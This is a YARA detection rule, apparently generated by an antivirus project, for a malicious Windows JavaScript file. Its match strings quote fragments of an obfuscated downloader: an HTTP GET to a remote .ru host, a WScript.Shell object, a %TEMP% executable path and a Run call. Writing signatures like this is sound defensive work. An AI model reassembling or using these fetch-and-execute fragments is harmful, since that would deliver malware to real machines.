rule sig_20160330_9ecf0c8009ea3eb248c7c8fc08d90d21 {
  meta:
    description = "datamaliciousorder - file 20160330_9ecf0c8009ea3eb248c7c8fc08d90d21.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "67154412af5b3e0d17a0c492f4f53fac9818d68e713e990267832b897aedaeaf"

  strings:
    $s1  = "H[D](\"GET\", \"http://webkits.ru/mn3dka\", false);" fullword ascii
    $s2  = "var MB = function DY() {return WScript[MW](\"WScript\"+\".Shell\");}(), E0 = 11;" fullword ascii
    $s3  = "function P0(XV, XN){Y = Y * 1; return XV - XN;};" fullword ascii
    $s4  = "if (H[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function UQ(){return MR + \"\";};" fullword ascii
    $s6  = "function VX() {return MB[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"NjYukQAdYgJolGv.ex\" + \"e\";};" fullword ascii
    $s7  = "function Z() {return ((SL == true) && (SL == CX)) ? 1 : Y;};" fullword ascii
    $s8  = "function Z0(WC){MB[\"Run\"](WC, Y, Y);};" fullword ascii
    $s9  = "function S()" fullword ascii
    $s10 = "var QI = new this[\"Date\"]();" fullword ascii
    $s11 = "function P(){return MW;};" fullword ascii
    $s12 = "}while (S0);" fullword ascii
    $s13 = "function RG(){return 22;};" fullword ascii
    $s14 = "return P0(KS, MD);" fullword ascii
    $s15 = "function E(CT) {var C = (1, 2, 3, 4, 5, CT); return C;};" fullword ascii
    $s16 = "var SL = false;" fullword ascii
    $s17 = "CX = true; " fullword ascii
    $s18 = "SL = true; " fullword ascii
    $s19 = "var II = false;" fullword ascii
    $s20 = "var CX = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}